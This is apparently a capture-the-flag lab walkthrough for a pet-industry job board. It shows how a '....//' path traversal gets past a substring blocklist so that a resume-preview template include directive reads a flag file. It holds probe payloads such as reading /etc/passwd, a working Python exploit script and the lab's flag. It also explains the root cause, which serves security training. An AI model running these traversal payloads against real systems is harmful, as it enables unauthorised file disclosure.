# furhire-012 - BugForge Lab Walkthrough

**URL:** https://lab-1782807416936-h02oim.labs-app.bugforge.io/
**Difficulty:** Medium
**Vulnerability:** Template LFI via custom `{{include:}}` directive - blocklist bypass using `....//` path traversal
**Flag:** `bug{yXnQKy7uMo2VIOtEsxoRqqdATK3RLEUl}`

---

## Summary

FurHire is a pet-industry job board with recruiter and job-seeker roles. The application allows job seekers to upload a resume PDF and preview its rendered content. The preview endpoint processes uploaded file content through a custom template engine that supports an `{{include:PATH}}` directive for file inclusion. A blocklist prevents reading sensitive files by rejecting paths containing `../`, but the blocklist performs a plain string match on the raw input. Submitting `....//` (four dots followed by a double slash) passes the string check while the underlying path resolver normalises it to `../../`, allowing traversal to `/data/flag.txt` outside the application root.

---

## Tech Stack

- Express.js (Node.js)
- JWT (stored in localStorage)
- SQLite
- Socket.IO
- React-style SPA frontend
- Custom template engine on the resume preview endpoint (`{{include:PATH}}`)
- File uploads via multipart/form-data to `POST /api/profile/resume`

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Accepts `role: "user"` or `"recruiter"` |
| `/api/login` | POST | No | Returns JWT |
| `/api/profile/resume` | POST | User JWT | Multipart upload, `name="resume"`, must be `Content-Type: application/pdf` |
| `/api/profile/resume/preview` | GET | User JWT | Returns `{"preview": "<rendered content>"}` - processes `{{include:PATH}}` in uploaded file |

---

## Discovery

### Step 1 - Map the application

Register a job-seeker account and a recruiter account. The seeker profile page at `/profile` has a resume upload section and a "Preview" button. Uploading a file and clicking Preview calls `GET /api/profile/resume/preview` which returns the file's content in a JSON field `preview`.

### Step 2 - Identify the template engine

Upload a file with the literal text `PROBE_123` and confirm `preview` returns `PROBE_123`. Then test for template directives:

```
{{include:test}}
```

The preview returns an empty string (not the literal text), meaning the engine is processing the directive rather than passing it through. The include directive is live.

Test with a known-sensitive path:

```
{{include:/etc/passwd}}
```

Preview returns `flag is elsewhere` - a blocklist is in place.

### Step 3 - Map the blocklist

Systematically probe paths to understand what is blocked vs. allowed:

| Input | Preview | Interpretation |
|-------|---------|---------------|
| `{{include:/etc/passwd}}` | `flag is elsewhere` | blocked |
| `{{include:../flag.txt}}` | `flag is elsewhere` | blocked - `../` detected |
| `{{include:flag.txt}}` | `` (empty) | allowed, file not found |
| `{{include:data/flag.txt}}` | `` (empty) | allowed, not found from CWD |
| `{{include:http://localhost/anything}}` | `flag is elsewhere` | HTTP schemes blocked |

The blocklist blocks common sensitive paths and the `../` traversal string. Files ending in `.txt` are not blocked by extension.

### Step 4 - Identify the flag location

Standard relative paths like `flag.txt` and `data/flag.txt` return empty (allowed but not found). Testing absolute paths confirms the application root is `/app`. The flag is not at `/app/flag.txt`. Trying `/data/flag.txt` directly:

```
{{include:/data/flag.txt}}
```

Preview returns `flag is elsewhere` - the `/data/` prefix is also blocked. The flag file exists outside the app directory, and any direct path to it is caught by the blocklist.

### Step 5 - Bypass the blocklist with `....//`

The blocklist uses a plain substring match. It rejects any path containing `../` but does not account for alternative representations. Testing `....//` (four dots, double slash):

- `....//` does NOT contain the substring `../`, so it passes the blocklist check
- The path resolver normalises `....//` - the four dots are treated as two `..` components and the double slash collapses to a single `/`, giving the equivalent of `../../`

From the application CWD `/app/`:

```
../../data/flag.txt  =>  /data/flag.txt
```

Payload:

```
{{include:....//data/flag.txt}}
```

Preview returns the flag.

---

## Exploit

```python
import urllib.request, json

TARGET = "https://lab-1782807416936-h02oim.labs-app.bugforge.io"

# Register and login
def api(path, body=None, tok=None):
    h = {"Content-Type": "application/json"}
    if tok: h["Authorization"] = "Bearer " + tok
    req = urllib.request.Request(TARGET + path,
        data=json.dumps(body).encode() if body else None, headers=h,
        method="POST" if body else "GET")
    r = urllib.request.urlopen(req)
    return json.loads(r.read())

r = api("/api/register", {"username": "attacker1", "email": "attacker1@x.io",
                           "password": "Pass123!", "role": "user"})
tok = api("/api/login", {"username": "attacker1", "password": "Pass123!"})["token"]

# Upload resume with traversal payload
payload = "{{include:....//data/flag.txt}}"
body = (b"--X\r\nContent-Disposition: form-data; name=\"resume\"; filename=\"cv.pdf\"\r\n"
        b"Content-Type: application/pdf\r\n\r\n" + payload.encode() + b"\r\n--X--\r\n")
req = urllib.request.Request(TARGET + "/api/profile/resume", data=body,
    headers={"Authorization": "Bearer " + tok,
             "Content-Type": "multipart/form-data; boundary=X"}, method="POST")
urllib.request.urlopen(req)

# Retrieve the flag via preview
result = api("/api/profile/resume/preview", tok=tok)
print(result["preview"])
# bug{yXnQKy7uMo2VIOtEsxoRqqdATK3RLEUl}
```

---

## Dead Ends

| Attempt | Why it failed |
|---------|--------------|
| `{{include:flag.txt}}` | Not found - flag is not in `/app/` |
| `{{include:/data/flag.txt}}` | Absolute path with `/data/` prefix blocked by blocklist |
| `{{include:../flag.txt}}` | `../` substring caught by blocklist |
| `{{include:../../flag.txt}}` | `../` substring caught by blocklist |
| `{{include:http://localhost/...}}` | HTTP scheme blocked entirely |
| `{{include:/etc/passwd}}` | Absolute system paths blocked |
| `{{include:database.db}}` | `.db` extension blocked |
| All JS/JSON/env source files | Blocked by extension or keyword match |

---

## Root Cause

The preview endpoint passes the uploaded file content through a custom template engine. The `{{include:PATH}}` directive reads an arbitrary file path and inlines its content. A blocklist guards against path traversal and sensitive-file access, but it checks the raw user-supplied string for the substring `../` rather than normalising the path first. The four-dot-double-slash sequence `....//` is functionally equivalent to `../../` after path normalisation but contains no `../` substring, bypassing the check entirely.

---

## CWE / OWASP

- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
- **CWE-184**: Incomplete List of Disallowed Inputs (blocklist bypass)
- **OWASP A03:2021** - Injection (template file inclusion)
- **OWASP A05:2021** - Security Misconfiguration (flag stored outside app root but reachable via traversal)
